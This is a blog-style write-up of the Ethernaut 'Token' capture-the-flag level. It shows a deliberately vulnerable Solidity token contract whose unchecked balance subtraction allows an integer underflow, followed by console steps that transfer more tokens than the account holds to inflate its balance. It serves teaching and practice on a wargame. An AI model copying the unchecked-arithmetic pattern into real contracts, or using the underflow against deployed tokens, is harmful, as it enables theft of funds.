---
layout: post
title: Ethernaut - 5.Token
date:  2022-08-27
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌑🌑🌑
> The goal of this level is for you to hack the basic token contract below.<br />
  You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.<br /> <br />
  Things that might help:
  - What is an odometer?

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

## Writeup
There is a famous security pitfall. We can use technique **Underoverflow** to complete this level.
1. Get new instance.
2. Call method 
    ``` solidity

    await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())

    ```
  It will return default balance `20` .
3. Call the method
    ``` solidity 

    await contract.transfer('OTHER_ACCOUNT', 1000000)

    ```
4. Call the method 
    ``` solidity

    await contract.balanceOf('YOUR_ACCOUNT').then(v=>v.toString())

    ```
  It will return a very big amount.
5. Submit instance ξ( ✿＞◡❛)


![](https://i.imgur.com/YINZhWH.png)
